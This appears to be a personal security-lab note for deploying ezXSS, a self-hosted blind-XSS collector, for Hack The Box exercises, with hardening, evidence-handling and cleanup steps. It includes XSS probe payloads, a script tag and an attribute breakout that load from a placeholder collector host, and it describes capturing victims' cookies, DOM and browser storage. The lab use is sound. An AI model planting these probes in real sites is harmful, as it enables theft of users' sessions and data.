---
title: "Blind XSS Tool - ezXSS"
description: "ezXSS is a self-hosted blind-XSS platform for generating probes, receiving browser reports, managing notifications, and controlling how evidence is…"
category: web
tags: ["web", "adcs", "xss"]
tools: []
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Web/Blind XSS Tool - ezXSS.md"
---
# Blind XSS Tool — ezXSS `fas:ClipboardList`

## Summary `ris:Eye`

[ezXSS](https://github.com/ssl/ezXSS) is a self-hosted blind-XSS platform for generating probes, receiving browser reports, managing notifications, and controlling how evidence is stored. Its Docker deployment can configure the database and obtain a TLS certificate automatically. For HTB use, keep public registration disabled, allowlist only the active lab domains, minimise collected data, and leave persistent-session features disabled unless a specific authorised lab objective requires them.

> [!danger]+ HTB-Only Boundary
> `fas:TriangleExclamation`
> 1. Use ezXSS only in Hack The Box, intentionally vulnerable applications, or systems you own and are explicitly authorised to test.
> 2. Reports may contain cookies, browser storage, DOM content, screenshots, internal URLs, and other sensitive lab data.
> 3. Do not enable public signup, recursive spidering, persistent sessions, or custom post-callback actions for the quick-start workflow.
> 4. See Cross-Site Scripting (XSS) - HTB Cheat Sheet for context selection, safe payload progression, and reporting.

---

## Conceptual Information `ris:GlobalLine`

### When to Use ezXSS

| Requirement | Fit |
|---|---|
| Detailed blind-XSS reports and flexible alerts | **Strong fit** |
| Strict domain allowlisting | **Strong fit** |
| Quick DNS/HTTP-only confirmation | Use Blind XSS Tool - Interactsh instead |
| Turnkey screenshot-oriented collector | Compare Blind XSS Tool - XSS Hunter |
| Local testing without TLS | Supported with `httpmode=true`, but unsuitable for HTTPS HTB pages |

### Core Components

1. **Web application**: Provides management, payload, report, and settings interfaces.
2. **Database**: Stores accounts, settings, payloads, and reports.
3. **Callback endpoint**: Receives evidence when a blind-XSS probe executes.
4. **Optional notifications**: Sends email or webhook alerts.
5. **Optional advanced features**: Custom JavaScript, automatic spidering, and persistent sessions; these materially increase impact and are excluded from the basic HTB workflow.

> [!warning]+ Dedicated Infrastructure
> `fas:TriangleExclamation`
> 1. Use a dedicated short hostname such as `e.YOUR_DOMAIN`.
> 2. Do not host ezXSS on a domain used for production, personal email, or unrelated applications.
> 3. Restrict the management interface to trusted source addresses where possible.
> 4. Keep database and screenshot storage encrypted at rest or on an ephemeral lab VPS.

---

## Prerequisites `ris:FileList`

| Requirement | Recommendation | Check |
|---|---|---|
| Linux server | Dedicated or disposable VPS | `uname -a` |
| Docker Engine | Current supported release | `docker --version` |
| Docker Compose | Compose v2 | `docker compose version` |
| Dedicated hostname | Short public hostname | `dig +short e.YOUR_DOMAIN` |
| TLS | Automatic Let's Encrypt or a trusted certificate | Browser and `curl` |
| Inbound ports | TCP `80` and `443` | Firewall and `ss` |
| Random database password | Unique high-entropy value | Password manager |
| Optional SMTP/webhook | Lab-only notification destination | Provider configuration |

> [!important]+ DNS and TLS Preparation
> `fas:TriangleExclamation`
> 1. Point the hostname to the VPS before starting the automatic certificate flow.
> 2. Ensure TCP `80` and `443` are reachable and not already bound.
> 3. Use HTTPS for callbacks from HTTPS pages; browsers commonly block insecure mixed content.
> 4. Take a VPS snapshot or record a rollback point before deployment.

---

## Commands and Implementation `ris:Command`

### 1. Preflight the Host

```bash
dig +short e.YOUR_DOMAIN
curl -4 https://icanhazip.com
sudo ss -lntp '( sport = :80 or sport = :443 )'
docker --version
docker compose version
```

> [!info]+ Preflight Breakdown
> `ris:Radar`
> 1. DNS should match the VPS public address.
> 2. Ports `80` and `443` should be available unless an intentional reverse proxy owns them.
> 3. Docker and Compose must both respond before cloning ezXSS.

### 2. Clone the Official Repository

```bash
git clone https://github.com/ssl/ezXSS.git
cd ezXSS
git status --short
docker compose config --services
```

> [!info]+ Command Breakdown
> `ris:Command`
> 1. **Official repository**: The project installation wiki uses `ssl/ezXSS`.
> 2. **Clean baseline**: Record local changes before updates.
> 3. **Compose validation**: Prints the service names and detects obvious configuration problems.

### 3. Create and Harden the Environment File

```bash
cp .env.example .env
chmod 600 .env
${EDITOR:-vi} .env
```

Set at least these values:

```dotenv
dbPassword=GENERATE_A_UNIQUE_RANDOM_PASSWORD
autoInstallCertificate=true
domain=e.YOUR_DOMAIN
httpmode=false
signupEnabled=false
debug=false
useMailAlerts=false
```

> [!info]+ Environment Breakdown
> `ris:LockPassword`
> 1. **`dbPassword`**: Replace the example with a unique random password; never commit `.env`.
> 2. **`autoInstallCertificate=true`**: Enables the Docker certificate workflow when DNS and ports are ready.
> 3. **`domain`**: Must match the public hostname used by payloads and TLS.
> 4. **`httpmode=false`**: Enforces the normal HTTPS deployment.
> 5. **`signupEnabled=false`**: Prevents arbitrary public account creation.
> 6. **`debug=false`**: Avoids exposing internal application errors.
> 7. **`useMailAlerts=false`**: Disables mail setup until SMTP is deliberately configured.

> [!warning]+ Local HTTP Mode
> `fas:TriangleExclamation`
> 1. `httpmode=true` is suitable only for isolated local testing.
> 2. An HTTP collector generally cannot load from an HTTPS target because of mixed-content blocking.
> 3. Do not use local HTTP mode as the default HTB deployment.

### 4. Validate and Start the Stack

```bash
docker compose config >/dev/null
docker compose up -d
docker compose ps
docker compose logs --tail=150
```

> [!info]+ Startup Breakdown
> `fas:Terminal`
> 1. **Configuration check**: Stops before deployment when YAML or environment interpolation is invalid.
> 2. **`up -d`**: Starts the application, database, and supporting services in the background.
> 3. **Logs**: Show certificate, database, web-server, or application initialisation errors.
> 4. The official guide states that the service should become accessible shortly after Docker completes startup.

### 5. Complete Web Installation

1. Browse to `https://e.YOUR_DOMAIN/manage/install`.
2. Create the administrator account with a unique username and password.
3. Sign in and verify that the management interface loads over valid HTTPS.
4. Confirm that public signup remains disabled.
5. Open settings and configure an **allowlist** containing only the active HTB lab domains.
6. Disable screenshot, DOM, browser-storage, and notification fields that are unnecessary for the exercise.
7. Leave custom JavaScript, automatic spidering, and persistent mode disabled.

> [!success]+ Expected Result
> `ris:Key`
> 1. `/manage/install` is no longer exposed after successful setup.
> 2. The management panel requires the new administrator credentials.
> 3. A self-test callback from an isolated page appears in the reports view.

### 6. Configure HTB Allowlisting

| Setting | Recommended HTB value | Reason |
|---|---|---|
| Allowlist | Exact active lab hostnames | Drops unrelated callbacks |
| Blocklist | Collector hostname and known self-test pages | Prevents noisy self-reports |
| Duplicate handling | Save once or suppress duplicates | Limits storage growth |
| Screenshot storage | Disable unless the objective requires it | Minimises sensitive evidence |
| DOM length | Small bounded value | Reduces report and notification size |
| Browser storage capture | Disable unless explicitly required | Avoids unnecessary sensitive data |
| Public signup | Disabled | Prevents unauthorised collector use |

> [!tip]+ Correlation Convention
> `fas:Lightbulb`
> 1. Name each payload after the field and timestamp, such as `support-message-20260808-1530`.
> 2. Submit one new field at a time.
> 3. Record the exact HTB request next to the payload name.

### 7. Create and Place a Probe

Copy the generated payload from ezXSS. Its shape will resemble:

```html
<script src="https://e.YOUR_DOMAIN/GENERATED_PAYLOAD_PATH"></script>
```

For a confirmed double-quoted attribute context:

```html
"><script src="https://e.YOUR_DOMAIN/GENERATED_PAYLOAD_PATH"></script>
```

> [!warning]+ Payload Discipline
> `fas:TriangleExclamation`
> 1. Use the exact generated path from your own instance.
> 2. Match the breakout to the observed HTML or JavaScript context.
> 3. Keep pre-callback and post-callback custom JavaScript empty for the first test.
> 4. Do not enable recursive spidering or broad collection simply because the platform supports it.

### 8. Interpret the Report

| Evidence | What it proves | Limitation |
|---|---|---|
| Callback time | When the payload executed | Server and browser clocks may differ |
| URI and origin | Where the browser rendered the probe | SPA navigation can alter visible routes |
| Referrer | Prior or embedding page | Referrer policy may redact it |
| User agent and IP | Browser and network context | Does not uniquely identify a user |
| Cookies | JavaScript-readable cookies | `HttpOnly` values are absent |
| DOM or screenshot | Affected page context | May contain unnecessary sensitive data |
| Local/session storage | Browser-side application data | Collect only when the lab objective requires it |

> [!success]+ Evidence Handling
> `ris:Key`
> 1. Correlate the report to its payload name, field, account, and time.
> 2. Export only the minimum evidence needed for the HTB write-up.
> 3. Remove stored lab payloads where the application permits.
> 4. Delete collector reports after verifying the final documentation.

### 9. Configure Optional Notifications

1. Create a lab-only email or webhook destination.
2. Enable only the matching notification integration.
3. Store tokens outside screenshots, notes, and version control.
4. Trigger a self-test and verify that secrets or full DOM data are not copied unnecessarily into the alert.
5. Rotate the token after the lab if it was exposed during debugging.

> [!warning]+ Notification Leakage
> `fas:TriangleExclamation`
> 1. Email, Slack, Discord, and Telegram alerts move evidence into a second system.
> 2. Prefer a short summary and a link to the restricted collector.
> 3. Never send real third-party session data through consumer notification services.

---

## Higher-Impact Features `fas:TriangleExclamation`

> [!danger]+ Persistent Sessions and ezProxy
> `fas:TriangleExclamation`
> 1. ezXSS can support persistent browser interaction and proxy-style features.
> 2. These features materially extend control over the affected browser and may relay authenticated actions or internal content.
> 3. Keep them disabled for routine blind-XSS confirmation.
> 4. Use them only when a specific HTB lab explicitly requires that impact and stop immediately after capturing the required proof.
> 5. Do not expose proxy listeners publicly or use them against real users.

---

## Operations and Lifecycle `ris:FileList`

### Logs and Health

```bash
docker compose ps
docker compose logs --tail=200
docker stats --no-stream
```

> [!info]+ Operational Checks
> `ris:FileList`
> 1. Inspect all services first, then add a service name to narrow the logs.
> 2. Watch disk and database growth when screenshots, DOM, or duplicate reports are enabled.
> 3. Disable unused notifications and advanced features rather than leaving failing integrations active.

### Backup

Identify the persistent mounts before copying them:

```bash
docker compose config > compose-resolved.yml
docker compose stop
cd ..
tar -czf "ezxss-backup-$(date +%F).tar.gz" ezXSS/.env ezXSS/compose-resolved.yml ezXSS
cd ezXSS
docker compose start
```

> [!warning]+ Backup Handling
> `fas:TriangleExclamation`
> 1. The archive may include database files, credentials, reports, screenshots, and callback data.
> 2. Review `docker compose config` for named volumes that are not stored inside the repository directory.
> 3. Encrypt the backup and retain it only until the HTB evidence is verified.

### Update

```bash
git status --short
git pull --ff-only
docker compose pull
docker compose up -d --build
docker compose ps
docker compose logs --tail=100
```

> [!info]+ Update Breakdown
> `ris:Command`
> 1. Back up the database and `.env` first.
> 2. Review release notes and `.env.example` changes before restarting.
> 3. Re-run a self-test probe after the upgrade.

### Stop and Cleanup

Stop the stack while preserving volumes:

```bash
docker compose down
```

Remove Compose-managed volumes only after exporting required evidence:

```bash
docker compose down --volumes
```

> [!danger]+ Destructive Cleanup
> `fas:TriangleExclamation`
> 1. `--volumes` can permanently delete the database and reports.
> 2. Bind-mounted files and encrypted backups remain separate and require deliberate review.
> 3. Revoke notification tokens and remove the DNS record when the collector is retired.

---

## Troubleshooting `ris:FileList`

> [!failure]+ “You did not setup your config file yet”
> `fas:CircleXmark`
> 1. Confirm `.env.example` was copied to `.env`.
> 2. Confirm the container can read the file and that it contains valid key/value lines.
> 3. Run `docker compose config` and inspect the application logs.

> [!failure]+ TLS or Callback Loading Fails
> `fas:CircleXmark`
> 1. Confirm DNS points to the server and TCP `80`/`443` are reachable.
> 2. Confirm `domain=e.YOUR_DOMAIN` and `autoInstallCertificate=true`.
> 3. Inspect certificate-related container logs.
> 4. Do not redirect the generated payload through extra HTTP-to-HTTPS hops without testing the exact URL.

> [!failure]+ Database Driver or Connection Error
> `fas:CircleXmark`
> 1. Confirm the database container is healthy and the `.env` password matches.
> 2. Inspect the application and database logs separately.
> 3. For non-Docker Apache/NGINX installations, verify the PHP PDO/MySQL driver and database permissions.

> [!failure]+ Screenshot Storage Error
> `fas:CircleXmark`
> 1. Disable screenshots if the lab does not require them.
> 2. Inspect the mounted storage path and container user ownership.
> 3. Avoid world-writable permissions; fix ownership to the documented application user instead.

> [!failure]+ HTTPS Probe Works but HTTP Probe Does Not
> `fas:CircleXmark`
> 1. Confirm the generated callback does not redirect unexpectedly.
> 2. Inspect browser Network and Console output.
> 3. Use HTTPS as the default because it works on both secure and many insecure lab pages.

---

## Lessons Learned `fas:Lightbulb`

1. ezXSS is most useful when its collection and notification settings are deliberately reduced to the lab objective.
2. Domain allowlisting prevents accidental or unrelated reports from becoming assessment data.
3. `signupEnabled=false`, strong admin authentication, and restricted management access are baseline requirements for an exposed collector.
4. Persistent features change the risk category of the exercise and should never be part of the default blind-XSS workflow.

---

## References `fas:BookOpen`

1. [ezXSS Repository](https://github.com/ssl/ezXSS)
2. [Official ezXSS Installation Guide](https://github.com/ssl/ezXSS/wiki/How-to%3A-install-ezXSS)
3. [ezXSS Setting Definitions](https://github.com/ssl/ezXSS/wiki/Setting-definitions)
4. [ezXSS Common Errors](https://github.com/ssl/ezXSS/wiki/Possible-error-messages)
5. [Docker Engine Installation](https://docs.docker.com/engine/install/)
6. Cross-Site Scripting (XSS) - HTB Cheat Sheet
7. Blind XSS Tool - XSS Hunter
8. Blind XSS Tool - Interactsh

#HTB #WebSecurity #XSS #BlindXSS #ezXSS
